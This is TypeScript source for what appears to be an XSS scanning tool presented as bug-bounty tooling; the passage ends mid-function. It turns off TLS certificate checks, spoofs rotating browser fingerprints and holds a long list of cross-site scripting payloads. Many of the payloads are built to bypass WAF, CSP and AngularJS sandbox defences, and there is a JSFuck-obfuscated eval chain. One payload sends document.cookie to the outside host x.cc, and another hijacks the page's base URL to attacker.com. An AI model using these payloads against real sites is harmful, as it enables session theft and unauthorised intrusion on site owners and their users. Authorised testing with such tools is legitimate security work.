// Disable SSL verification for security research / bug bounty testing
// This allows scanning sites with self-signed or misconfigured certificates.
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const PROBE_MARKER = "xssrflct";

// ─── Rotating User-Agents (realistic browser pool) ───────────────────────────
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
];

function randomUA(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// ─── Fetch with retry ─────────────────────────────────────────────────────────
async function fetchWithRetry(
  url: string,
  timeoutMs: number,
  maxRetries = 1
): Promise<string | null> {
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const resp = await fetch(url, {
        signal: controller.signal,
        headers: {
          "User-Agent":      randomUA(),
          "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate",
          "Cache-Control":   "no-cache",
          "Pragma":          "no-cache",
          "Connection":      "keep-alive",
          "Upgrade-Insecure-Requests": "1",
          "Sec-Fetch-Dest":  "document",
          "Sec-Fetch-Mode":  "navigate",
          "Sec-Fetch-Site":  "none",
          "Sec-Ch-Ua":       '"Chromium";v="126", "Google Chrome";v="126", "Not-A.Brand";v="99"',
          "Sec-Ch-Ua-Mobile":"?0",
          "Sec-Ch-Ua-Platform": '"Windows"',
        },
        redirect: "follow",
      });
      clearTimeout(timer);
      if (resp.status >= 500 && attempt < maxRetries) {
        await new Promise(r => setTimeout(r, 300 * (attempt + 1)));
        continue;
      }
      return await resp.text();
    } catch (err) {
      clearTimeout(timer);
      // Abort = timeout, connection refused, SSL error — all are non-fatal for the scan
      if (attempt === maxRetries) return null;
      await new Promise(r => setTimeout(r, 200 * (attempt + 1)));
    }
  }
  return null;
}

export interface DetectionPayload {
  payload: string;
  context: string;
  bypassType: string;
}

export const DETECTION_PAYLOADS: DetectionPayload[] = [
  // ── 1. Basic HTML injection ──────────────────────────────────────────────────
  { payload: `<${PROBE_MARKER}>`,                                           context: "html_body",          bypassType: "basic" },
  { payload: `</${PROBE_MARKER}>`,                                          context: "html_body",          bypassType: "basic" },
  { payload: `<${PROBE_MARKER} id=1>`,                                      context: "html_body",          bypassType: "basic" },
  { payload: `<b>${PROBE_MARKER}</b>`,                                      context: "html_body",          bypassType: "basic" },
  { payload: `<i>${PROBE_MARKER}</i>`,                                      context: "html_body",          bypassType: "basic" },
  { payload: `<u>${PROBE_MARKER}</u>`,                                      context: "html_body",          bypassType: "basic" },

  // ── 2. Script tag variants ───────────────────────────────────────────────────
  { payload: `<script>${PROBE_MARKER}()</script>`,                          context: "script_tag",         bypassType: "basic" },
  { payload: `<ScRiPt>${PROBE_MARKER}()</sCrIpT>`,                          context: "script_tag",         bypassType: "case_bypass" },
  { payload: `<SCRIPT>${PROBE_MARKER}()</SCRIPT>`,                          context: "script_tag",         bypassType: "case_bypass" },
  { payload: `</script><script>${PROBE_MARKER}()</script>`,                 context: "script_break",       bypassType: "context_break" },
  { payload: `<!--><script>${PROBE_MARKER}()</script>`,                     context: "comment_break",      bypassType: "comment_bypass" },
  { payload: `<script/>${PROBE_MARKER}()`,                                  context: "script_selfclose",   bypassType: "waf_bypass" },
  { payload: `<script\n>${PROBE_MARKER}()</script>`,                        context: "script_newline",     bypassType: "waf_bypass" },
  { payload: `<script\t>${PROBE_MARKER}()</script>`,                        context: "script_tab",         bypassType: "waf_bypass" },
  { payload: `<script\r>${PROBE_MARKER}()</script>`,                        context: "script_cr",          bypassType: "waf_bypass" },
  { payload: `<script src=data:,${PROBE_MARKER}()>`,                        context: "script_data_uri",    bypassType: "data_uri" },
  { payload: `<script>/**/${PROBE_MARKER}/**/()/**/</script>`,              context: "script_comment_pad", bypassType: "comment_padding" },
  { payload: `<script>eval('${PROBE_MARKER}()')</script>`,                  context: "script_eval",        bypassType: "eval_bypass" },
  { payload: `<script>window['${PROBE_MARKER}']()</script>`,                context: "script_window",      bypassType: "eval_bypass" },
  { payload: `<script type="text/javascript">${PROBE_MARKER}()</script>`,   context: "script_typed",       bypassType: "basic" },
  { payload: `<script language="javascript">${PROBE_MARKER}()</script>`,    context: "script_lang",        bypassType: "waf_bypass" },

  // ── 3. Attribute break — double quote ────────────────────────────────────────
  { payload: `"><${PROBE_MARKER}>`,                                          context: "attr_dq_break",      bypassType: "basic" },
  { payload: `"><script>${PROBE_MARKER}()</script>`,                         context: "attr_dq_script",     bypassType: "basic" },
  { payload: `" onmouseover="${PROBE_MARKER}()`,                             context: "attr_dq_event",      bypassType: "basic" },
  { payload: `"><img src=x onerror=${PROBE_MARKER}()>`,                      context: "attr_dq_event",      bypassType: "basic" },
  { payload: `"><svg onload=${PROBE_MARKER}()>`,                             context: "attr_dq_svg",        bypassType: "basic" },
  { payload: `"><details open ontoggle=${PROBE_MARKER}()>`,                  context: "attr_dq_details",    bypassType: "html5" },
  { payload: `"><input autofocus onfocus=${PROBE_MARKER}()>`,                context: "attr_dq_focus",      bypassType: "html5" },
  { payload: `"><iframe onload=${PROBE_MARKER}()>`,                          context: "attr_dq_iframe",     bypassType: "basic" },
  { payload: `"onmouseover="${PROBE_MARKER}()`,                              context: "attr_dq_nospace",    bypassType: "waf_bypass" },
  { payload: `" autofocus onfocus="${PROBE_MARKER}()`,                       context: "attr_dq_focus2",     bypassType: "html5" },
  { payload: `"/**/onmouseover="${PROBE_MARKER}()`,                          context: "attr_dq_comment",    bypassType: "waf_bypass" },
  { payload: `"><body onload="${PROBE_MARKER}()">`,                          context: "attr_dq_body",       bypassType: "basic" },
  { payload: `"><form action="javascript:${PROBE_MARKER}()">`,               context: "attr_dq_form",       bypassType: "javascript_uri" },
  { payload: `" onclick="${PROBE_MARKER}()`,                                 context: "attr_dq_click",      bypassType: "basic" },
  { payload: `"><video src=x onerror="${PROBE_MARKER}()">`,                  context: "attr_dq_video",      bypassType: "html5" },
  { payload: `"><audio src=x onerror="${PROBE_MARKER}()">`,                  context: "attr_dq_audio",      bypassType: "html5" },

  // ── 4. Attribute break — single quote ────────────────────────────────────────
  { payload: `'><${PROBE_MARKER}>`,                                          context: "attr_sq_break",      bypassType: "basic" },
  { payload: `'><script>${PROBE_MARKER}()</script>`,                         context: "attr_sq_script",     bypassType: "basic" },
  { payload: `' onmouseover='${PROBE_MARKER}()`,                             context: "attr_sq_event",      bypassType: "basic" },
  { payload: `'><img src=x onerror=${PROBE_MARKER}()>`,                      context: "attr_sq_img",        bypassType: "basic" },
  { payload: `'><svg onload=${PROBE_MARKER}()>`,                             context: "attr_sq_svg",        bypassType: "basic" },
  { payload: `' onclick='${PROBE_MARKER}()`,                                 context: "attr_sq_click",      bypassType: "basic" },
  { payload: `'onmouseover='${PROBE_MARKER}()`,                              context: "attr_sq_nospace",    bypassType: "waf_bypass" },
  { payload: `'><details open ontoggle='${PROBE_MARKER}()'>`,                context: "attr_sq_details",    bypassType: "html5" },
  { payload: `' autofocus onfocus='${PROBE_MARKER}()`,                       context: "attr_sq_focus",      bypassType: "html5" },

  // ── 5. Event handlers — comprehensive ───────────────────────────────────────
  { payload: `<img src=x onerror=${PROBE_MARKER}()>`,                        context: "event_onerror",      bypassType: "basic" },
  { payload: `<img src=x onerror="${PROBE_MARKER}()">`,                      context: "event_onerror_q",    bypassType: "basic" },
  { payload: `<img/src=x onerror=${PROBE_MARKER}()>`,                        context: "event_slash",        bypassType: "waf_bypass" },
  { payload: `<img src=x:y onerror=${PROBE_MARKER}()>`,                      context: "event_colon",        bypassType: "waf_bypass" },
  { payload: `<img src="x" onerror="${PROBE_MARKER}()">`,                    context: "event_quoted",       bypassType: "basic" },
  { payload: `<img src=x oNeRrOr=${PROBE_MARKER}()>`,                        context: "event_case",         bypassType: "case_bypass" },
  { payload: `<img src=x\tonerror=${PROBE_MARKER}()>`,                       context: "event_tab_sep",      bypassType: "waf_bypass" },
  { payload: `<img src=x\nonerror=${PROBE_MARKER}()>`,                       context: "event_nl_sep",       bypassType: "waf_bypass" },
  { payload: `<svg onload=${PROBE_MARKER}()>`,                               context: "event_svg",          bypassType: "basic" },
  { payload: `<svg/onload=${PROBE_MARKER}()>`,                               context: "event_svg_slash",    bypassType: "waf_bypass" },
  { payload: `<svg onload\t=${PROBE_MARKER}()>`,                             context: "event_svg_tab",      bypassType: "waf_bypass" },
  { payload: `<svg onload\n=${PROBE_MARKER}()>`,                             context: "event_svg_nl",       bypassType: "waf_bypass" },
  { payload: `<svg><script>${PROBE_MARKER}()</script>`,                      context: "event_svg_script",   bypassType: "basic" },
  { payload: `<svg><animate onbegin=${PROBE_MARKER}() attributeName=x>`,    context: "event_svg_animate",  bypassType: "svg_element" },
  { payload: `<svg><set onbegin=${PROBE_MARKER}() attributeName=x to=1>`,   context: "event_svg_set",      bypassType: "svg_element" },
  { payload: `<body onload=${PROBE_MARKER}()>`,                              context: "event_body",         bypassType: "basic" },
  { payload: `<body onpageshow=${PROBE_MARKER}()>`,                          context: "event_body_page",    bypassType: "html5" },
  { payload: `<body onerror=${PROBE_MARKER}()>`,                             context: "event_body_err",     bypassType: "basic" },
  { payload: `<body onhashchange=${PROBE_MARKER}()>`,                        context: "event_hashchange",   bypassType: "html5" },
  { payload: `<input autofocus onfocus=${PROBE_MARKER}()>`,                  context: "event_focus",        bypassType: "basic" },
  { payload: `<input autofocus onblur=${PROBE_MARKER}()>`,                   context: "event_blur",         bypassType: "html5" },
  { payload: `<input autofocus onkeydown=${PROBE_MARKER}()>`,                context: "event_keydown",      bypassType: "html5" },
  { payload: `<details open ontoggle=${PROBE_MARKER}()>`,                    context: "event_details",      bypassType: "html5" },
  { payload: `<details open ontoggle="${PROBE_MARKER}()">`,                  context: "event_details_q",    bypassType: "html5" },
  { payload: `<summary ontoggle=${PROBE_MARKER}()>x</summary>`,              context: "event_summary",      bypassType: "html5" },
  { payload: `<video><source onerror=${PROBE_MARKER}()>`,                    context: "event_video",        bypassType: "basic" },
  { payload: `<video autoplay oncanplay=${PROBE_MARKER}()><source src=1>`,   context: "event_video_play",   bypassType: "html5" },
  { payload: `<video onloadstart=${PROBE_MARKER}()><source src=x>`,          context: "event_video_ls",     bypassType: "html5" },
  { payload: `<audio src=x onerror=${PROBE_MARKER}()>`,                      context: "event_audio",        bypassType: "html5" },
  { payload: `<audio autoplay oncanplaythrough=${PROBE_MARKER}()>`,          context: "event_audio_play",   bypassType: "html5" },
  { payload: `<iframe onload=${PROBE_MARKER}()>`,                            context: "event_iframe",       bypassType: "basic" },
  { payload: `<iframe srcdoc="<img src=x onerror=${PROBE_MARKER}()>">`,      context: "event_iframe_srcdoc",bypassType: "srcdoc" },
  { payload: `<iframe src=javascript:${PROBE_MARKER}()>`,                    context: "event_iframe_js",    bypassType: "javascript_uri" },
  { payload: `<marquee onstart=${PROBE_MARKER}()>`,                          context: "event_marquee",      bypassType: "deprecated_tag" },
  { payload: `<marquee loop=1 onfinish=${PROBE_MARKER}()>x</marquee>`,       context: "event_marquee_fin",  bypassType: "deprecated_tag" },
  { payload: `<object data="javascript:${PROBE_MARKER}()">`,                 context: "event_object",       bypassType: "javascript_uri" },
  { payload: `<math><mtext></noscript></math><script>${PROBE_MARKER}()`,     context: "event_math_ns",      bypassType: "namespace_break" },
  { payload: `<form><button formaction=javascript:${PROBE_MARKER}()>`,       context: "event_form_btn",     bypassType: "html5" },
  { payload: `<isindex type=image src=1 onerror=${PROBE_MARKER}()>`,         context: "event_isindex",      bypassType: "deprecated_tag" },
  { payload: `<keygen autofocus onfocus=${PROBE_MARKER}()>`,                 context: "event_keygen",       bypassType: "deprecated_tag" },
  { payload: `<select autofocus onfocus=${PROBE_MARKER}()>`,                 context: "event_select",       bypassType: "html5" },
  { payload: `<textarea autofocus onfocus=${PROBE_MARKER}()>`,               context: "event_textarea",     bypassType: "html5" },
  { payload: `<button onclick=${PROBE_MARKER}() autofocus>`,                 context: "event_button",       bypassType: "html5" },
  { payload: `<a href="javascript:${PROBE_MARKER}()">click</a>`,             context: "event_anchor_js",    bypassType: "javascript_uri" },
  { payload: `<a href=javascript:${PROBE_MARKER}()>x</a>`,                  context: "event_anchor_bare",  bypassType: "javascript_uri" },
  { payload: `<link rel=stylesheet href="javascript:${PROBE_MARKER}()">`,    context: "event_link",         bypassType: "javascript_uri" },

  // ── 6. JavaScript string break ───────────────────────────────────────────────
  { payload: `\`;${PROBE_MARKER}()//`,                                       context: "js_string_backtick", bypassType: "js_break" },
  { payload: `";${PROBE_MARKER}()//`,                                        context: "js_string_double",   bypassType: "js_break" },
  { payload: `';${PROBE_MARKER}()//`,                                        context: "js_string_single",   bypassType: "js_break" },
  { payload: `\\";${PROBE_MARKER}()//`,                                      context: "js_string_escape",   bypassType: "js_break" },
  { payload: `'-${PROBE_MARKER}()-'`,                                        context: "js_string_concat",   bypassType: "js_break" },
  { payload: `\`-${PROBE_MARKER}()-\``,                                      context: "js_template_lit",    bypassType: "js_break" },
  { payload: `</script><script>${PROBE_MARKER}()</script>`,                  context: "js_close_script",    bypassType: "context_break" },
  { payload: `</script><img src=x onerror=${PROBE_MARKER}()>`,               context: "js_close_img",       bypassType: "context_break" },
  { payload: `\u2028${PROBE_MARKER}()//`,                                    context: "js_line_sep",        bypassType: "unicode_break" },
  { payload: `\u2029${PROBE_MARKER}()//`,                                    context: "js_para_sep",        bypassType: "unicode_break" },

  // ── 7. URI / href ────────────────────────────────────────────────────────────
  { payload: `javascript:${PROBE_MARKER}()`,                                 context: "uri_js",             bypassType: "javascript_uri" },
  { payload: `javascript:void(${PROBE_MARKER}())`,                           context: "uri_js_void",        bypassType: "javascript_uri" },
  { payload: `JAVASCRIPT:${PROBE_MARKER}()`,                                 context: "uri_js_upper",       bypassType: "case_bypass" },
  { payload: `javascript&#58;${PROBE_MARKER}()`,                             context: "uri_entity",         bypassType: "entity_bypass" },
  { payload: `&#106;avascript:${PROBE_MARKER}()`,                            context: "uri_entity2",        bypassType: "entity_bypass" },
  { payload: `java\tscript:${PROBE_MARKER}()`,                               context: "uri_tab",            bypassType: "waf_bypass" },
  { payload: `java\nscript:${PROBE_MARKER}()`,                               context: "uri_nl",             bypassType: "waf_bypass" },
  { payload: `java\rscript:${PROBE_MARKER}()`,                               context: "uri_cr",             bypassType: "waf_bypass" },
  { payload: `data:text/html,<script>${PROBE_MARKER}()</script>`,            context: "uri_data",           bypassType: "data_uri" },

  // ── 8. WAF bypass — advanced ──────────────────────────────────────────────────
  { payload: `<img%20src=x%20onerror=${PROBE_MARKER}()>`,                   context: "waf_urlenc",         bypassType: "url_encode" },
  { payload: `<img+src=x+onerror=${PROBE_MARKER}()>`,                       context: "waf_plus",           bypassType: "url_encode" },
  { payload: `<img\rsrc=x\ronerror=${PROBE_MARKER}()>`,                     context: "waf_cr",             bypassType: "waf_bypass" },
  { payload: `<img\nsrc=x\nonerror=${PROBE_MARKER}()>`,                     context: "waf_lf",             bypassType: "waf_bypass" },
  { payload: `</*!--><img src=x onerror=${PROBE_MARKER}()>`,                context: "waf_cond_comment",   bypassType: "comment_bypass" },
  { payload: `<input/onfocus=${PROBE_MARKER}() autofocus>`,                  context: "waf_slash_space",    bypassType: "waf_bypass" },
  { payload: `<a/href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;${PROBE_MARKER}()>x</a>`, context: "waf_full_hex", bypassType: "entity_bypass" },
  { payload: `<svg><script xlink:href=data:,${PROBE_MARKER}()>`,            context: "waf_svg_xlink",      bypassType: "svg_element" },
  { payload: `<math href="javascript:${PROBE_MARKER}()">x</math>`,          context: "waf_math_href",      bypassType: "namespace_break" },

  // ── 9. HTML5 elements ────────────────────────────────────────────────────────
  { payload: `<menu id=x tabindex=1 onblur=${PROBE_MARKER}()></menu>`,       context: "h5_menu",            bypassType: "html5" },
  { payload: `<dialog open onclose=${PROBE_MARKER}()>`,                      context: "h5_dialog",          bypassType: "html5" },
  { payload: `<template><script>${PROBE_MARKER}()</script></template>`,      context: "h5_template",        bypassType: "html5" },

  // ── 10. DOM / eval obfuscation ───────────────────────────────────────────────
  { payload: `<script>eval(String.fromCharCode(${[...PROBE_MARKER+'()'].map(c=>c.charCodeAt(0)).join(',')}))</script>`, context: "dom_fromcharcode", bypassType: "eval_bypass" },
  { payload: `<script>setTimeout('${PROBE_MARKER}()',0)</script>`,            context: "dom_settimeout",     bypassType: "eval_bypass" },
  { payload: `<script>[].constructor.constructor('${PROBE_MARKER}()')();</script>`, context: "dom_constructor", bypassType: "eval_bypass" },
  { payload: `<script>Function('${PROBE_MARKER}()')();</script>`,             context: "dom_function",       bypassType: "eval_bypass" },
  { payload: `<script>window['ev'+'al']('${PROBE_MARKER}()')</script>`,      context: "dom_eval_split",     bypassType: "eval_bypass" },
  { payload: `<script>top['${PROBE_MARKER}']()</script>`,                    context: "dom_top",            bypassType: "eval_bypass" },

  // ── 11. CSS / style injection ────────────────────────────────────────────────
  { payload: `</style><script>${PROBE_MARKER}()</script>`,                   context: "css_break_script",   bypassType: "context_break" },
  { payload: `</style><img src=x onerror=${PROBE_MARKER}()>`,                context: "css_break_img",      bypassType: "context_break" },
  { payload: `<x style="expression(${PROBE_MARKER}())">`,                   context: "css_expression",     bypassType: "css_break" },

  // ── 12. Template injection ────────────────────────────────────────────────────
  { payload: `{{${PROBE_MARKER}()}}`,                                        context: "tmpl_angular",       bypassType: "template" },
  { payload: `${`\${${PROBE_MARKER}()}`}`,                                   context: "tmpl_generic",       bypassType: "template" },
  { payload: `<%= ${PROBE_MARKER}() %>`,                                     context: "tmpl_erb",           bypassType: "template" },
  { payload: `#{${PROBE_MARKER}()}`,                                         context: "tmpl_ruby",          bypassType: "template" },
  { payload: `[[${PROBE_MARKER}()]]`,                                        context: "tmpl_thymeleaf",     bypassType: "template" },

  // ── 13. Polyglot payloads ────────────────────────────────────────────────────
  { payload: `'"><img src=x onerror=${PROBE_MARKER}()><script>${PROBE_MARKER}()</script>`, context: "poly_1", bypassType: "polyglot" },
  { payload: `\`'"><svg/onload=${PROBE_MARKER}()>`,                          context: "poly_2",             bypassType: "polyglot" },
  { payload: `';${PROBE_MARKER}();//"><img src=x onerror=${PROBE_MARKER}()>`,context: "poly_3",             bypassType: "polyglot" },
  { payload: `%0a${PROBE_MARKER}()`,                                         context: "poly_newline",       bypassType: "url_encode" },
  { payload: `%3Cscript%3E${PROBE_MARKER}()%3C/script%3E`,                  context: "poly_urlenc_full",   bypassType: "url_encode" },

  // ── 14. Blind XSS probes ──────────────────────────────────────────────────────
  { payload: `<img src=x onerror="fetch('//x.cc/${PROBE_MARKER}?c='+document.cookie)">`, context: "blind_fetch", bypassType: "blind" },

  // ── 15. Encoding chains ───────────────────────────────────────────────────────
  { payload: `&#60;script&#62;${PROBE_MARKER}()&#60;/script&#62;`,          context: "enc_decimal",        bypassType: "entity_bypass" },
  { payload: `&#x3C;script&#x3E;${PROBE_MARKER}()&#x3C;/script&#x3E;`,     context: "enc_hex",            bypassType: "entity_bypass" },
  { payload: `\u003cscript\u003e${PROBE_MARKER}()\u003c/script\u003e`,      context: "enc_unicode",        bypassType: "unicode_bypass" },
  { payload: `%3cscript%3e${PROBE_MARKER}()%3c%2fscript%3e`,               context: "enc_url_full",       bypassType: "url_encode" },
  { payload: `%3Cimg%20src%3Dx%20onerror%3D${PROBE_MARKER}()%3E`,          context: "enc_url_img",        bypassType: "url_encode" },

  // ── 16. Mutation XSS (mXSS) ──────────────────────────────────────────────────
  { payload: `<noscript><p title="</noscript><img src=x onerror=${PROBE_MARKER}()>">`,  context: "mxss_noscript",  bypassType: "mxss" },
  { payload: `<listing>\n<img src=x\nonerror=${PROBE_MARKER}()>\n</listing>`,           context: "mxss_listing",   bypassType: "mxss" },

  // ── 17. Iframe sandbox bypass ─────────────────────────────────────────────────
  { payload: `<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>${PROBE_MARKER}()</script>">`, context: "iframe_sandbox", bypassType: "sandbox_bypass" },
  { payload: `<iframe src="data:text/html,<script>${PROBE_MARKER}()</script>">`,           context: "iframe_data",    bypassType: "data_uri" },

  // ── 18. Extra aggressive WAF bypass combos ────────────────────────────────────
  { payload: `<iMg SrC=x OnErRoR=${PROBE_MARKER}()>`,                       context: "waf_mixcase",        bypassType: "case_bypass" },
  { payload: `<IMG SRC=x ONERROR=${PROBE_MARKER}()>`,                       context: "waf_allcaps",        bypassType: "case_bypass" },
  { payload: `<img	src=x	onerror=${PROBE_MARKER}()>`,                  context: "waf_tabsep",         bypassType: "waf_bypass" },
  { payload: `<script >  ${PROBE_MARKER}()  </script >`,                    context: "waf_spaces",         bypassType: "waf_bypass" },

  // ── 19. AngularJS sandbox escapes ─────────────────────────────────────────────
  { payload: `{{constructor.constructor('${PROBE_MARKER}()')()}}`,                              context: "angularjs_1",    bypassType: "angularjs" },
  { payload: `{{$on.constructor('${PROBE_MARKER}()')()}}`,                                      context: "angularjs_2",    bypassType: "angularjs" },
  { payload: `{{a=toString().constructor.prototype;a.charAt=[].join;$eval('x=1} } };${PROBE_MARKER}()//');}}`, context: "angularjs_3", bypassType: "angularjs" },
  { payload: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}`,               context: "angularjs_4",    bypassType: "angularjs" },
  { payload: `<div ng-app ng-csp>{{$eval.constructor('${PROBE_MARKER}()')()}}</div>`,           context: "angularjs_5",    bypassType: "angularjs" },
  { payload: `<div ng-app>{{constructor.constructor('${PROBE_MARKER}()')()}}</div>`,            context: "angularjs_6",    bypassType: "angularjs" },
  { payload: `{{[].pop.constructor('${PROBE_MARKER}()')()}}`,                                   context: "angularjs_7",    bypassType: "angularjs" },

  // ── 20. CSP bypass via JSONP & trusted CDNs ────────────────────────────────────
  { payload: `<script src="https://accounts.google.com/o/oauth2/revoke?callback=${PROBE_MARKER}">`, context: "csp_google",   bypassType: "csp_bypass" },
  { payload: `<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js?${PROBE_MARKER}">`, context: "csp_jquery",  bypassType: "csp_bypass" },
  { payload: `<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js?cb=${PROBE_MARKER}">`, context: "csp_cdnjs",   bypassType: "csp_bypass" },

  // ── 21. Double URL encoding ────────────────────────────────────────────────────
  { payload: `%253Cscript%253E${PROBE_MARKER}()%253C%252Fscript%253E`,       context: "dblenc_script",      bypassType: "double_encode" },
  { payload: `%253Cimg%2520src%253Dx%2520onerror%253D${PROBE_MARKER}()%253E`,context: "dblenc_img",         bypassType: "double_encode" },
  { payload: `&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;${PROBE_MARKER}()&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;`, context: "hex_entity_full", bypassType: "entity_bypass" },

  // ── 22. Unicode & homoglyph attacks ──────────────────────────────────────────
  { payload: `<ſcript>${PROBE_MARKER}()</ſcript>`,                          context: "unicode_s",          bypassType: "unicode_bypass" },
  { payload: `<\u0073cript>${PROBE_MARKER}()</\u0073cript>`,                 context: "unicode_u0073",      bypassType: "unicode_bypass" },
  { payload: `<img src=\u0000x onerror=${PROBE_MARKER}()>`,                  context: "unicode_null",       bypassType: "null_byte" },

  // ── 23. postMessage / DOM sink attacks ───────────────────────────────────────
  { payload: `<iframe src=/ onload="this.contentWindow.postMessage('<img src=x onerror=${PROBE_MARKER}()>','*')">`, context: "postmsg_1", bypassType: "dom_sink" },

  // ── 24. DOM clobbering ────────────────────────────────────────────────────────
  { payload: `<form id=x><input id=attributes><img src=x onerror=${PROBE_MARKER}()></form>`, context: "dom_clobber", bypassType: "dom_clobber" },

  // ── 25. Base tag hijack ───────────────────────────────────────────────────────
  { payload: `<base href=//attacker.com/>`,                                  context: "csp_base",           bypassType: "csp_bypass" },

  // ── 26. XSS via SVG element namespace injection ────────────────────────────────
  { payload: `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><foreignObject><script>${PROBE_MARKER}()</script></foreignObject></svg>#x"/>`, context: "svg_use", bypassType: "svg_element" },
  { payload: `<svg><foreignObject><script>${PROBE_MARKER}()</script></foreignObject></svg>`,  context: "svg_foreign",    bypassType: "svg_element" },
  { payload: `<svg onload=eval(atob('${Buffer.from(`${PROBE_MARKER}()`).toString('base64')}'))>`, context: "svg_base64", bypassType: "eval_bypass" },

  // ── 27. Obfuscated eval chains ────────────────────────────────────────────────
  { payload: `<script>(+[])[(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+(!![]+[])[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]('${PROBE_MARKER}()')()`,
                                                                              context: "jsfuck_eval",        bypassType: "jsfuck" },

  // ── 28. Niche browser quirks ─────────────────────────────────────────────────
  { payload: `<script>/*</script><script>*/${PROBE_MARKER}()</script>`,      context: "quirk_comment",      bypassType: "context_break" },
  { payload: `<script>with(document)write('<img src=x onerror=${PROBE_MARKER}()>');</script>`, context: "quirk_with", bypassType: "js_break" },
  { payload: `<img dynsrc="${PROBE_MARKER}()">`,                             context: "quirk_ie_dynsrc",    bypassType: "deprecated_tag" },
  { payload: `<img lowsrc=javascript:${PROBE_MARKER}()>`,                   context: "quirk_ie_lowsrc",    bypassType: "javascript_uri" },
  { payload: `<bgsound src=javascript:${PROBE_MARKER}()>`,                  context: "quirk_bgsound",      bypassType: "deprecated_tag" },
  { payload: `<input type=image src=1 onerror=${PROBE_MARKER}()>`,          context: "quirk_input_img",    bypassType: "basic" },

  // ── 29. Recursive/embedded contexts ──────────────────────────────────────────
  { payload: `<svg><desc><![CDATA[</desc><script>${PROBE_MARKER}()</script>]]></svg>`, context: "cdata_svg", bypassType: "cdata_bypass" },
  { payload: `<math><annotation-xml encoding="text/html"><script>${PROBE_MARKER}()</script></annotation-xml></math>`, context: "math_annotation", bypassType: "namespace_break" },
];

// ─── Concurrency control ──────────────────────────────────────────────────────
export async function withConcurrency<T>(
  tasks: (() => Promise<T>)[],
  limit: number
